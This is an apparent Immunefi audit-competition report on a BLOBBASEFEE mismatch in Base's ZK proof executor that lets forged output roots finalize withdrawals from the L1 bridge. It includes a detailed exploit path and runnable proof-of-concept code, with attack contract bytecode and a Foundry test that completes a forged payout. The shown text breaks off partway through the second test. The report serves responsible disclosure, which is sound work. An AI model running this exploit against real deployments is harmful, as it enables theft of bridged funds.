# 75413 sc high zk proof executor derives blobbasefee from base s da footprint header field allowing invalid output roots

**Submitted on Apr 29th 2026 at 01:55:46 UTC by @Brainiac5 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75413
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1
  * Draining or stealing funds from the L1 bridge portal through invalid withdrawal proofs constructed against a forged finalized state
  * Circumventing the dispute/challenge mechanism to prevent correction of an invalid proposal before finalization

## Description

## Brief/Intro

Base disables L2 blob transactions. Its protocol docs explicitly state that `BLOBBASEFEE` is present but must always push `1` because no L2 blobs are processed. Canonical Base execution implements this rule by hardcoding `BlobExcessGasAndPrice { excess_blob_gas: 0, blob_gasprice: 1 }` when building the EVM block environment.

The ZK proof executor does not use the same Base-specific rule. For post-Ecotone/Isthmus blocks, it derives the next block's blob gas price from the parent header using Ethereum blob-gas rules. This is wrong after Jovian because Base reuses the header `blob_gas_used` field to store the block's DA footprint, not Ethereum blob gas.

As a result, an attacker can create a normal high-DA-footprint parent block, then include a transaction in the next block whose contract branches on `block.blobbasefee`. Canonical Base execution sees `1`; the proof executor can see a value greater than `1`. The same transaction can therefore produce a different output root in the ZK proof path than it produces on real Base.

## Vulnerability Details

Base documents the opcode semantics as:

```
The BLOBBASEFEE opcode is present ... The opcode will always push a value of 1 onto the stack.
```

Canonical Base EVM environment construction follows that rule:

```rust
let blob_excess_gas_and_price = spec
    .into_eth_spec()
    .is_enabled_in(SpecId::CANCUN)
    .then_some(BlobExcessGasAndPrice { excess_blob_gas: 0, blob_gasprice: 1 });
```

The same hardcoded value is used in the normal header path, next-block path, and payload path:

* `base/crates/execution/evm/src/lib.rs:81`
* `base/crates/execution/evm/src/lib.rs:112`
* `base/crates/execution/evm/src/lib.rs:292`

The proof executor builds the block environment differently:

```rust
let (params, fraction) = if spec_id.is_enabled_in(OpSpecId::ISTHMUS) {
    (Some(BlobParams::prague()), BLOB_BASE_FEE_UPDATE_FRACTION_PRAGUE)
} else if spec_id.is_enabled_in(OpSpecId::ECOTONE) {
    (Some(BlobParams::cancun()), BLOB_BASE_FEE_UPDATE_FRACTION_CANCUN)
} else {
    (None, 0)
};

let blob_excess_gas_and_price = parent_header
    .maybe_next_block_excess_blob_gas(params)
    .or_else(|| spec_id.is_enabled_in(OpSpecId::ECOTONE).then_some(0))
    .map(|excess| BlobExcessGasAndPrice::new(excess, fraction));
```

Relevant code:

* `base/crates/proof/executor/src/builder/env.rs:104`
* `base/crates/proof/executor/src/builder/env.rs:112`

That logic is valid for Ethereum blob-gas headers, but not for Base post-Jovian headers. Jovian intentionally stores DA footprint in `blob_gas_used`:

```rust
// In jovian, we're using the blob gas used field to store the current da
// footprint's value.
(Some(0), Some(*blob_gas_used))
```

Relevant code:

* `base/crates/execution/evm/src/build.rs:83`
* `base/crates/proof/executor/src/builder/assemble.rs:64`
* `base/crates/common/evm/src/executor/block_executor.rs:171`
* `base/crates/common/evm/src/executor/block_executor.rs:306`

The proof executor therefore treats a Base DA-footprint value as Ethereum blob gas. Once the parent DA footprint is above the Prague blob-gas target, `BlobExcessGasAndPrice::new()` returns a blob gas price greater than `1`, contradicting Base's canonical `BLOBBASEFEE` semantics.

## Exploit Path

{% stepper %}
{% step %}

## 1. Create a high-DA-footprint parent block

The attacker creates or waits for a normal Base L2 parent block with high DA footprint. This is reachable with calldata-heavy transactions; after Jovian, Base stores that DA footprint in the parent header's `blob_gas_used`.
{% endstep %}

{% step %}

## 2. Include a contract that branches on `block.blobbasefee`

In the next L2 block, the attacker calls a contract that branches on `block.blobbasefee`.
{% endstep %}

{% step %}

## 3. Canonical Base follows the harmless branch

Canonical Base execution sees `block.blobbasefee == 1`, so the contract takes the harmless branch.
{% endstep %}

{% step %}

## 4. The proof executor follows the proof-only branch

The ZK proof executor derives blob gas price from the parent header's DA-footprint value and can see `block.blobbasefee > 1`, so the same transaction takes a proof-only branch.
{% endstep %}

{% step %}

## 5. The proof-only branch creates attacker-controlled effects

The proof-only branch can write attacker-controlled storage or call the real `L2ToL1MessagePasser.initiateWithdrawal(...)`.
{% endstep %}

{% step %}

## 6. The range proof computes a forged output root

The range proof computes an output root for the proof executor's non-canonical state transition.
{% endstep %}

{% step %}

## 7. The aggregation program commits that root

The aggregation program commits that output root into the same public-input journal that `AggregateVerifier` verifies.
{% endstep %}

{% step %}

## 8. `AggregateVerifier` accepts the proof

`AggregateVerifier` accepts the ZK proof for the forged output root. Sepolia game type `621` was deployed with `PROOF_THRESHOLD=1`, so one accepted proof is enough for resolution after the finalization delay.
{% endstep %}

{% step %}

## 9. The portal can finalize a forged withdrawal

If the proof-only branch created an `L2ToL1MessagePasser` withdrawal marker, `OptimismPortal2.proveWithdrawalTransaction()` can prove the forged storage slot against the accepted output root and finalization can release L1 bridge funds.
{% endstep %}
{% endstepper %}

## Impact Details

This is a proof-system soundness failure. The ZK proof can be valid for the proof executor's transition while the transition is not the canonical Base transition.

The dangerous downstream path is the same bridge-root flow used by normal withdrawals:

* `AggregateVerifier._verifyZkProof()` hashes proposer, L1 origin, start root, end root, L2 sequence range, intermediate roots, config hash, and `ZK_RANGE_HASH`.
* `ZK_VERIFIER.verify()` accepts the aggregate proof for that journal.
* A resolved `DEFENDER_WINS` game can become claim-valid in `AnchorStateRegistry`.
* `OptimismPortal2.proveWithdrawalTransaction()` proves the withdrawal storage slot under the game's root claim.
* `OptimismPortal2.finalizeWithdrawalTransactionExternalProof()` then releases funds if the game remains claim-valid.

Relevant downstream code:

* `base/crates/proof/succinct/utils/client/src/client.rs:188`
* `base/crates/proof/succinct/utils/client/src/witness/executor.rs:172`
* `base/crates/proof/succinct/programs/aggregation/src/main.rs:102`
* `contracts/src/multiproof/AggregateVerifier.sol:393`
* `contracts/src/multiproof/AggregateVerifier.sol:458`
* `contracts/src/multiproof/AggregateVerifier.sol:917`
* `contracts/src/multiproof/AggregateVerifier.sol:932`
* `contracts/src/L1/OptimismPortal2.sol:385`
* `contracts/src/L1/OptimismPortal2.sol:549`

This does not require:

* Compromising Base-operated infrastructure.
* A leaked TEE or ZK key.
* An invalid SP1 proof.
* A privileged address.
* An upstream OP Stack bug.

The emergency ability to blacklist, retire, pause, or replace a verifier may reduce exploitability after detection, but the vulnerability is that Base's in-scope ZK proof executor accepts a state transition that canonical Base execution rejects.

## Why This Is In Scope

The Immunefi scope page lists Base Sepolia after the April 20, 2026 Azul activation as the competition environment and includes Offchain Components, Base Azul, and Implementation Contracts. It also calls out proof-system integration and Base-native execution logic as high-value areas. Base mainnet is a planned target deployment, but not the competition environment.

This report is in scope because:

* The root cause is in `base/base` proof executor code, not an out-of-scope `actions`, `devnet`, `baseup`, or `etc` folder.
* The bug is Base-specific: Base's Jovian DA-footprint reuse of `blob_gas_used` conflicts with the proof executor's Ethereum blob-gas calculation.
* The report does not depend on core Op-Succinct circuit soundness. It depends on Base's integration code feeding the wrong block environment to the execution proof.
* The downstream impact crosses into the in-scope `AggregateVerifier` and `OptimismPortal2` verification/finalization boundary.
* The PoC is runnable locally and does not touch public testnet/mainnet.

This is not an upstream OP Stack issue. The mismatch exists because Base changed the header semantics for Jovian DA footprint while the Base proof executor still treats `blob_gas_used` as Ethereum blob gas for `BLOBBASEFEE`.

## References

* Immunefi Base Azul scope: `https://immunefi.com/audit-competition/audit-comp-base-azul/scope/`
* Base execution spec for disabled L2 blobs and `BLOBBASEFEE`: `base/docs/specs/pages/protocol/execution/index.md:446-448`
* Canonical Base EVM hardcodes blob gas price to `1`: `base/crates/execution/evm/src/lib.rs:81-84`
* Canonical next-block env hardcodes blob gas price to `1`: `base/crates/execution/evm/src/lib.rs:112-115`
* Canonical payload env hardcodes blob gas price to `1`: `base/crates/execution/evm/src/lib.rs:292-295`
* Proof executor derives blob gas price from parent header: `base/crates/proof/executor/src/builder/env.rs:104-115`
* Jovian header construction stores DA footprint in `blob_gas_used`: `base/crates/execution/evm/src/build.rs:83-87`
* Proof executor assembled headers also store DA footprint in `blob_gas_used`: `base/crates/proof/executor/src/builder/assemble.rs:64-65`
* Jovian DA footprint is charged per transaction: `base/crates/common/evm/src/executor/block_executor.rs:171-190`
* Sepolia activates Jovian and Azul: `base/crates/common/chains/src/config.rs:332-333`
* Sepolia max gas limit: `base/crates/common/chains/src/config.rs:356`
* Sepolia multiproof game type and proof threshold: `contract-deployments/sepolia/2026-04-20-activate-multiproof/.env:6-16`
* Apr 23 ZK config update in the `contract-deployments` repo on `origin/main`: `sepolia/2026-04-23-update-zk-config/.env`
* AggregateVerifier ZK journal construction: `contracts/src/multiproof/AggregateVerifier.sol:917-932`
* Portal withdrawal proof/finality checks: `contracts/src/L1/OptimismPortal2.sol:385-414`, `contracts/src/L1/OptimismPortal2.sol:518-550`
* Runnable state-divergence PoC: `base/crates/proof/succinct/utils/client/tests/audit_blobbasefee_withdrawal_impact.rs`
* Runnable portal-payout PoC: `contracts/test/multiproof/AuditBlobbasefeeForgedWithdrawalEndToEnd.t.sol`

## Suggested Fix

Build the proof executor's `blob_excess_gas_and_price` the same way canonical Base execution does:

```rust
let blob_excess_gas_and_price = spec_id
    .into_eth_spec()
    .is_enabled_in(SpecId::CANCUN)
    .then_some(BlobExcessGasAndPrice { excess_blob_gas: 0, blob_gasprice: 1 });
```

Do not feed Base's Jovian DA-footprint `blob_gas_used` header value into EIP-4844/EIP-7691 blob gas pricing.

Add regression tests that:

* Assert `prepare_block_env()` returns `blob_gasprice == 1` for all post-Ecotone Base blocks.
* Execute a contract that branches on `BLOBBASEFEE` under canonical and proof-executor environments and assert identical state roots.
* Use a Jovian parent header with nonzero/high DA footprint to prevent this exact regression.

## Confidence

Confirmed locally with two runnable PoCs.

PoC 1 proves the exact attacker-controlled state divergence: canonical Base semantics keep `BLOBBASEFEE` at `1` and no withdrawal marker is created, while the proof-executor environment derives `BLOBBASEFEE > 1` from Base's DA-footprint `blob_gas_used` field and creates the real `L2ToL1MessagePasser.sentMessages[withdrawalHash]` marker.

PoC 2 proves the downstream bridge impact once that forged output root is accepted by the multiproof game: `OptimismPortal2` proves and finalizes the withdrawal and the target receives `1 ETH`.

> `Note: PoC for this report and detailed impact extraction & reproduction was aided with the help of AI.`

## Proof of Concept

This report has two runnable PoCs.

Fresh-checkout reproduction note:

* The two PoC files listed below are audit-only test files and are not present in the upstream repositories. Include them as attachments, or paste them into the exact paths shown before running the commands.
* PoC 1 does not require `Cargo.toml` changes; it uses dependencies already available to `base-proof-succinct-client-utils`.
* The `--config 'target.aarch64-apple-darwin.rustflags=["-C","link-arg=-fuse-ld=ld"]'` flag is a local macOS linker workaround. Linux triage environments can omit it if unnecessary.
* PoC 2 uses the repository's existing `OptimismPortal2` FFI helper, the same helper used by existing portal tests.

PoC 1 proves the root-cause execution divergence and the attacker impact on L2 state. The same attacker transaction is executed twice with the same Base Azul precompile table and same `L2ToL1MessagePasser` runtime bytecode. The only difference is the block `blob_gasprice` value:

* Canonical Base env: `blob_gasprice = 1`.
* Proof-executor env: `blob_gasprice` is derived from a Jovian DA-footprint value in the parent header.

PoC 1 file:

```
base/crates/proof/succinct/utils/client/tests/audit_blobbasefee_withdrawal_impact.rs
```

Run PoC 1:

```sh
cd /Users/shealtielanz/bounty/base-azul/base
RUSTUP_TOOLCHAIN=1.93.1 cargo test --locked \
  -p base-proof-succinct-client-utils \
  --test audit_blobbasefee_withdrawal_impact \
  --config 'target.aarch64-apple-darwin.rustflags=["-C","link-arg=-fuse-ld=ld"]' \
  -- --nocapture
```

Observed result for PoC 1:

```
running 1 test
test audit_blobbasefee_mismatch_can_create_withdrawal_marker ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

Important PoC 1 assertions:

```rust
assert_eq!(canonical.blob_gasprice, 1);
assert_eq!(canonical.returned_branch, U256::ZERO);
assert_eq!(canonical.sent_message_slot_value, U256::ZERO);
assert_eq!(canonical.message_nonce, U256::ZERO);
assert_eq!(canonical.message_passer_balance, U256::ZERO);
assert_eq!(canonical.attacker_contract_balance, U256::from(ONE_ETH));

assert!(proof_executor.blob_gasprice > 1);
assert_eq!(proof_executor.returned_branch, U256::from(1));
assert_eq!(proof_executor.sent_message_slot_value, U256::from(1));
assert_eq!(proof_executor.message_nonce, U256::from(1));
assert_eq!(proof_executor.message_passer_balance, U256::from(ONE_ETH));
assert_eq!(proof_executor.attacker_contract_balance, U256::ZERO);
```

The attack contract condition is only:

```solidity
if (block.blobbasefee == 1) return 0;
L2ToL1MessagePasser.initiateWithdrawal{value: 1 ether}(target, 100_000, "");
return 1;
```

So PoC 1 shows the actual attacker capability:

* On canonical Base, no withdrawal marker exists and the attacker contract keeps its `1 ETH`.
* In the proof-executor state, the withdrawal marker exists, `msgNonce` increments, and the message passer receives `1 ETH`.

PoC 2 proves the downstream L1 payout path once that forged withdrawal output root is accepted by `AggregateVerifier`.

PoC 2 file:

```
contracts/test/multiproof/AuditBlobbasefeeForgedWithdrawalEndToEnd.t.sol
```

Run PoC 2:

```sh
cd /Users/shealtielanz/bounty/base-azul/contracts
forge test --match-path test/multiproof/AuditBlobbasefeeForgedWithdrawalEndToEnd.t.sol -vvv
```

Observed result for PoC 2:

```
Ran 1 test for test/multiproof/AuditBlobbasefeeForgedWithdrawalEndToEnd.t.sol:AuditBlobbasefeeForgedWithdrawalEndToEndTest
[PASS] testAcceptedBlobbasefeeForgedWithdrawalRootPaysOutFromPortal() (gas: 785273)

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Important PoC 2 assertions:

```solidity
assertEq(outputRoot, Hashing.hashOutputRootProof(outputRootProof));
assertEq(withdrawalHash, Hashing.hashWithdrawal(forgedWithdrawal));

(AggregateVerifier game, uint256 gameIndex) = _createAcceptedZkGame(outputRoot);

assertEq(uint8(game.status()), uint8(GameStatus.DEFENDER_WINS));
assertTrue(anchorStateRegistry.isGameClaimValid(IDisputeGame(address(game))));

optimismPortal2.proveWithdrawalTransaction(forgedWithdrawal, gameIndex, outputRootProof, withdrawalProof);
optimismPortal2.finalizeWithdrawalTransaction(forgedWithdrawal);

assertTrue(optimismPortal2.finalizedWithdrawals(withdrawalHash));
assertEq(WITHDRAWAL_TARGET.balance, targetBalanceBefore + forgedWithdrawal.value);
```

PoC 2 intentionally uses a strict local verifier that accepts only the exact expected ZK public-input journal for the forged output root. PoC 1 proves the Base proof-executor path can create that non-canonical withdrawal state from the `BLOBBASEFEE` mismatch. PoC 2 proves that once the root is accepted by the normal game/portal flow, the bridge payout succeeds.

### Full PoC 1 Source

<details>

<summary>Show full PoC 1 source</summary>

Save as:

```
base/crates/proof/succinct/utils/client/tests/audit_blobbasefee_withdrawal_impact.rs
```

```rust
//! Audit PoC: proof-executor BLOBBASEFEE mismatch can create a withdrawal marker
//! that canonical Base Azul execution does not create.
//!
//! The attack contract only calls the real L2ToL1MessagePasser predeploy when
//! `block.blobbasefee != 1`. Canonical Base execution always exposes
//! `BLOBBASEFEE == 1`, while the proof executor can derive a larger value from
//! the parent header's Jovian DA-footprint `blob_gas_used` field.

use alloy_consensus::{BlockHeader, Header};
use alloy_eips::eip7840::BlobParams;
use alloy_primitives::{Address, B256, Bytes, U256, address, hex, keccak256};
use alloy_sol_types::SolValue;
use base_common_evm::{
    BasePrecompiles, BaseTransaction, Builder as _, DefaultBase as _, L1BlockInfo, OpSpecId,
};
use revm::{
    Context, ExecuteCommitEvm,
    bytecode::Bytecode,
    context::{BlockEnv, CfgEnv, TxEnv},
    context_interface::block::BlobExcessGasAndPrice,
    database::InMemoryDB,
    primitives::{TxKind, eip4844::BLOB_BASE_FEE_UPDATE_FRACTION_PRAGUE},
    state::AccountInfo,
};

const ONE_ETH: u128 = 1_000_000_000_000_000_000;
const ATTACKER_CONTRACT: Address = address!("4242424242424242424242424242424242424242");
const CALLER: Address = address!("1111111111111111111111111111111111111111");
const WITHDRAWAL_TARGET: Address = address!("2222222222222222222222222222222222222222");
const MESSAGE_PASSER: Address = address!("4200000000000000000000000000000000000016");

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BlobFeeEnv {
    // Canonical Base behavior: L2 blobs are disabled, so BLOBBASEFEE is always 1.
    CanonicalBase,
    // Buggy proof behavior: derive BLOBBASEFEE from the parent header's DA-footprint field.
    ProofExecutorFromJovianDaFootprint,
}

#[derive(Debug)]
struct RunOutcome {
    blob_gasprice: u128,
    returned_branch: U256,
    sent_message_slot_value: U256,
    message_nonce: U256,
    message_passer_balance: U256,
    attacker_contract_balance: U256,
}

fn canonical_base_blob_env() -> BlobExcessGasAndPrice {
    // This mirrors canonical Base execution env construction for Cancun-and-later blocks.
    BlobExcessGasAndPrice { excess_blob_gas: 0, blob_gasprice: 1 }
}

fn proof_executor_blob_env_from_jovian_da_footprint() -> BlobExcessGasAndPrice {
    let prague_params = BlobParams::prague();
    // Simulate a Jovian parent block whose DA footprint is stored in `blob_gas_used`.
    // This value is not Ethereum blob gas, but the proof executor treats it as if it is.
    let parent_da_footprint = prague_params.target_blob_gas_per_block() + 10_000_000;
    let parent_header = Header {
        blob_gas_used: Some(parent_da_footprint),
        excess_blob_gas: Some(0),
        base_fee_per_gas: Some(1_000_000_000),
        ..Default::default()
    };

    // This is the incorrect proof-executor calculation: it converts Base DA footprint
    // into an EIP-4844 blob gas price, making BLOBBASEFEE greater than 1.
    let proof_excess = parent_header
        .maybe_next_block_excess_blob_gas(Some(prague_params))
        .expect("post-Ecotone header has blob-gas fields");
    BlobExcessGasAndPrice::new(proof_excess, BLOB_BASE_FEE_UPDATE_FRACTION_PRAGUE)
}

fn block_env(blob_excess_gas_and_price: BlobExcessGasAndPrice) -> BlockEnv {
    // Both executions use the same block fields except for BLOBBASEFEE.
    BlockEnv {
        number: U256::from(1),
        timestamp: U256::from(1_776_708_000_u64),
        gas_limit: 45_000_000,
        basefee: 0,
        blob_excess_gas_and_price: Some(blob_excess_gas_and_price),
        ..Default::default()
    }
}

fn attack_contract_bytecode() -> Bytecode {
    // The attacker contract is intentionally tiny: only BLOBBASEFEE decides whether
    // the withdrawal marker is created. This isolates the proof-environment mismatch.
    // Runtime:
    //   if block.blobbasefee == 1 return 0
    //   codecopy(0, withdrawalCalldataOffset, withdrawalCalldataSize)
    //   call(gas(), L2_TO_L1_MESSAGE_PASSER, 1 ether, 0, withdrawalCalldataSize, 0, 0)
    //   return 1
    let withdrawal_calldata = initiate_withdrawal_calldata();
    assert!(withdrawal_calldata.len() <= u8::MAX as usize);

    let mut code = Vec::new();
    code.extend_from_slice(&hex!("4a600114"));

    // If BLOBBASEFEE equals 1, jump to the harmless canonical branch.
    code.push(0x60);
    let canonical_offset_pos = code.len();
    code.push(0);
    code.push(0x57);

    // Proof-only branch: copy initiateWithdrawal calldata into memory.
    code.push(0x60);
    code.push(withdrawal_calldata.len() as u8);
    code.push(0x60);
    let data_offset_pos = code.len();
    code.push(0);
    code.push(0x5f);
    code.push(0x39);

    // Proof-only branch: call the real L2ToL1MessagePasser with 1 ETH.
    code.extend_from_slice(&[0x5f, 0x5f, 0x60, withdrawal_calldata.len() as u8, 0x5f, 0x67]);
    code.extend_from_slice(&(ONE_ETH as u64).to_be_bytes());
    code.push(0x73);
    code.extend_from_slice(MESSAGE_PASSER.as_slice());
    code.extend_from_slice(&[0x5a, 0xf1, 0x50]);

    // Return 1 to make it obvious that the proof-only withdrawal branch executed.
    code.extend_from_slice(&hex!("60015f5260205ff3"));

    let canonical_offset = code.len();
    assert!(canonical_offset <= u8::MAX as usize);
    // Canonical branch: return 0 and do not touch the message passer.
    code.push(0x5b);
    code.extend_from_slice(&hex!("5f5f5260205ff3"));

    let data_offset = code.len();
    assert!(data_offset <= u8::MAX as usize);
    code[canonical_offset_pos] = canonical_offset as u8;
    code[data_offset_pos] = data_offset as u8;
    code.extend_from_slice(&withdrawal_calldata);

    Bytecode::new_legacy(Bytes::from(code))
}

fn initiate_withdrawal_calldata() -> Bytes {
    // initiateWithdrawal(target, gasLimit, data), with empty withdrawal data.
    Bytes::from(hex!(
        "c2b3e5ac\
         0000000000000000000000002222222222222222222222222222222222222222\
         00000000000000000000000000000000000000000000000000000000000186a0\
         0000000000000000000000000000000000000000000000000000000000000060\
         0000000000000000000000000000000000000000000000000000000000000000"
    ))
}

fn expected_withdrawal_hash() -> B256 {
    // L2ToL1MessagePasser computes the withdrawal hash from nonce, sender,
    // target, value, gas limit, and calldata. This mirrors that calculation.
    let nonce = U256::from(1) << 240;
    keccak256(
        (
            nonce,
            ATTACKER_CONTRACT,
            WITHDRAWAL_TARGET,
            U256::from(ONE_ETH),
            U256::from(100_000),
            Bytes::new(),
        )
            .abi_encode_sequence(),
    )
}

fn expected_sent_message_storage_slot() -> U256 {
    // sentMessages is mapping(bytes32 => bool) at storage slot 0.
    let slot = keccak256((expected_withdrawal_hash(), U256::ZERO).abi_encode_sequence());
    U256::from_be_slice(slot.as_slice())
}

fn l2_to_l1_message_passer_bytecode() -> Bytecode {
    // Runtime bytecode for the real L2ToL1MessagePasser predeploy used by Base/OP Stack.
    Bytecode::new_legacy(Bytes::from(hex!(
        "6080604052600436106100695760003560e01c806382e3702d1161004357806382e3702d14610120578063c2b3e5ac14610160578063ecc704281461017357600080fd5b80633f827a5a1461009257806344df8e70146100bf57806354fd4d50146100d457600080fd5b3661008d5761008b33620186a0604051806020016040528060008152506101d8565b005b600080fd5b34801561009e57600080fd5b506100a7600181565b60405161ffff90911681526020015b60405180910390f35b3480156100cb57600080fd5b5061008b61039c565b3480156100e057600080fd5b50604080518082018252600581527f312e322e30000000000000000000000000000000000000000000000000000000602082015290516100b691906104c7565b34801561012c57600080fd5b5061015061013b3660046104e1565b60006020819052908152604090205460ff1681565b60405190151581526020016100b6565b61008b61016e366004610529565b34801561017f57600080fd5b506101ca6001547dffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff167e010000000000000000000000000000000000000000000000000000000000001790565b6040519081526020016100b6565b600061026e6040518060c001604052806102326001547dffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff167e010000000000000000000000000000000000000000000000000000000000001790565b815233602082015273ffffffffffffffffffffffffffffffffffffffff871660408201523460608201526080810186905260a0018490526103d4565b600081815260208190526040902080547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00166001179055905073ffffffffffffffffffffffffffffffffffffffff8416336103096001547dffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff167e010000000000000000000000000000000000000000000000000000000000001790565b7f02a52367d10742d8032712c1bb8e0144ff1ec5ffda1ed7d70bb05a27449550543487878760405161033e949392919061062d565b60405180910390a45050600180547dffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8082168301167fffff0000000000000000000000000000000000000000000000000000000000009091161790555050565b476103a681610421565b60405181907f7967de617a5ac1cc7eba2d6f37570a0135afa950d8bb77cdd35f0d0b4e85a16f90600090a250565b80516020808301516040808501516060860151608087015160a0880151935160009761040497909695910161065d565b604051602081830303815290604052805190602001209050919050565b8060405161042e90610450565b6040518091039082f090508015801561044b573d6000803e3d6000fd5b505050565b6008806106b583390190565b6000815180845260005b8181101561048257602081850181015186830182015201610466565b81811115610494576000602083870101525b50601f017fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0169290920160200192915050565b6020815260006104da602083018461045c565b9392505050565b6000602082840312156104f357600080fd5b5035919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b60008060006060848603121561053e57600080fd5b833573ffffffffffffffffffffffffffffffffffffffff8116811461056257600080fd5b925060208401359150604084013567ffffffffffffffff8082111561058657600080fd5b818601915086601f83011261059a57600080fd5b8135818111156105ac576105ac6104fa565b604051601f82017fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0908116603f011681019083821181831017156105f2576105f26104fa565b8160405282815289602084870101111561060b57600080fd5b8260208601602083013760006020848301015280955050505050509250925092565b84815283602082015260806040820152600061064c608083018561045c565b905082606083015295945050505050565b868152600073ffffffffffffffffffffffffffffffffffffffff808816602084015280871660408401525084606083015283608083015260c060a08301526106a860c083018461045c565b9897505050505050505056fe608060405230fffea164736f6c634300080f000a"
    )))
}

fn run_with_blob_fee_env(env: BlobFeeEnv) -> RunOutcome {
    // Run the same transaction twice. The only meaningful difference is the
    // BLOBBASEFEE value supplied in the block environment.
    let blob_env = match env {
        BlobFeeEnv::CanonicalBase => canonical_base_blob_env(),
        BlobFeeEnv::ProofExecutorFromJovianDaFootprint => {
            proof_executor_blob_env_from_jovian_da_footprint()
        }
    };

    // Install the attacker contract and the real message passer bytecode in an in-memory state.
    let mut db = InMemoryDB::default();
    db.insert_account_info(
        ATTACKER_CONTRACT,
        AccountInfo {
            balance: U256::from(ONE_ETH),
            code: Some(attack_contract_bytecode()),
            ..Default::default()
        },
    );
    db.insert_account_info(
        MESSAGE_PASSER,
        AccountInfo { code: Some(l2_to_l1_message_passer_bytecode()), ..Default::default() },
    );
    db.insert_account_info(
        CALLER,
        AccountInfo { balance: U256::from(10 * ONE_ETH), ..Default::default() },
    );

    // Use Base Azul configuration and the canonical Base precompile table in both executions.
    // This keeps the PoC focused only on the block env mismatch.
    let evm = Context::base()
        .with_db(db)
        .with_cfg(CfgEnv::new_with_spec(OpSpecId::AZUL))
        .with_block(block_env(blob_env))
        .with_chain(L1BlockInfo {
            l2_block: Some(U256::ZERO),
            operator_fee_scalar: Some(U256::ZERO),
            operator_fee_constant: Some(U256::ZERO),
            ..Default::default()
        })
        .build_base();

    // The caller simply invokes the attacker contract. The contract branches internally on BLOBBASEFEE.
    let tx = BaseTransaction::builder()
        .base(
            TxEnv::builder()
                .caller(CALLER)
                .kind(TxKind::Call(ATTACKER_CONTRACT))
                .data(Bytes::new())
                .gas_limit(200_000),
        )
        .enveloped_tx(Some(Bytes::from_static(b"AUDIT-BLOBBASEFEE")))
        .build_fill();

    let mut evm = evm.with_precompiles(BasePrecompiles::new_with_spec(OpSpecId::AZUL));
    let result = evm.transact_commit(tx).expect("tx should execute");
    let db = evm.into_context().journaled_state.database;

    // Read the exact bridge-relevant state: sentMessages[withdrawalHash], nonce, and balances.
    let message_passer = db.cache.accounts.get(&MESSAGE_PASSER).expect("message passer exists");
    let attacker_contract =
        db.cache.accounts.get(&ATTACKER_CONTRACT).expect("attacker contract exists");

    RunOutcome {
        blob_gasprice: blob_env.blob_gasprice,
        returned_branch: U256::from_be_slice(result.output().expect("branch output exists")),
        sent_message_slot_value: message_passer
            .storage
            .get(&expected_sent_message_storage_slot())
            .copied()
            .unwrap_or_default(),
        message_nonce: message_passer.storage.get(&U256::from(1)).copied().unwrap_or_default(),
        message_passer_balance: message_passer.info().expect("message passer info exists").balance,
        attacker_contract_balance: attacker_contract
            .info()
            .expect("attacker contract info exists")
            .balance,
    }
}

#[test]
fn audit_blobbasefee_mismatch_can_create_withdrawal_marker() {
    let canonical = run_with_blob_fee_env(BlobFeeEnv::CanonicalBase);
    let proof_executor = run_with_blob_fee_env(BlobFeeEnv::ProofExecutorFromJovianDaFootprint);

    // Canonical Base sees BLOBBASEFEE == 1, so the harmless branch executes.
    // No withdrawal marker is created and the attacker contract keeps its ETH.
    assert_eq!(canonical.blob_gasprice, 1);
    assert_eq!(canonical.returned_branch, U256::ZERO);
    assert_eq!(canonical.sent_message_slot_value, U256::ZERO);
    assert_eq!(canonical.message_nonce, U256::ZERO);
    assert_eq!(canonical.message_passer_balance, U256::ZERO);
    assert_eq!(canonical.attacker_contract_balance, U256::from(ONE_ETH));

    // The proof environment sees BLOBBASEFEE > 1, so the same transaction creates
    // a real sentMessages[withdrawalHash] marker only in the proven state.
    assert!(proof_executor.blob_gasprice > 1);
    assert_eq!(proof_executor.returned_branch, U256::from(1));
    assert_eq!(proof_executor.sent_message_slot_value, U256::from(1));
    assert_eq!(proof_executor.message_nonce, U256::from(1));
    assert_eq!(proof_executor.message_passer_balance, U256::from(ONE_ETH));
    assert_eq!(proof_executor.attacker_contract_balance, U256::ZERO);
}
```

</details>

### Full PoC 2 Source

<details>

<summary>Show full PoC 2 source</summary>

Save as:

```
contracts/test/multiproof/AuditBlobbasefeeForgedWithdrawalEndToEnd.t.sol
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { OptimismPortal2_TestInit } from "test/L1/OptimismPortal2.t.sol";

import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { IVerifier } from "interfaces/multiproof/IVerifier.sol";

import { Types } from "src/libraries/Types.sol";
import { Hashing } from "src/libraries/Hashing.sol";
import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";
import { MockVerifier } from "src/multiproof/mocks/MockVerifier.sol";
import { Verifier } from "src/multiproof/Verifier.sol";
import { Claim, GameStatus, GameType, Hash } from "src/dispute/lib/Types.sol";

contract BlobbasefeeStrictJournalVerifier is Verifier {
    bytes32 public expectedJournal;

    constructor(IAnchorStateRegistry anchorStateRegistry) Verifier(anchorStateRegistry) { }

    function setExpectedJournal(bytes32 journal) external {
        // The test verifier accepts only the exact journal for the forged output root.
        // This models "AggregateVerifier accepted the ZK public inputs" without faking
        // arbitrary roots or bypassing the portal path.
        expectedJournal = journal;
    }

    function verify(bytes calldata, bytes32, bytes32 journal) external view override notNullified returns (bool) {
        return journal == expectedJournal;
    }
}

contract AuditBlobbasefeeForgedWithdrawalEndToEndTest is OptimismPortal2_TestInit {
    GameType internal constant AGGREGATE_VERIFIER_GAME_TYPE = GameType.wrap(621);
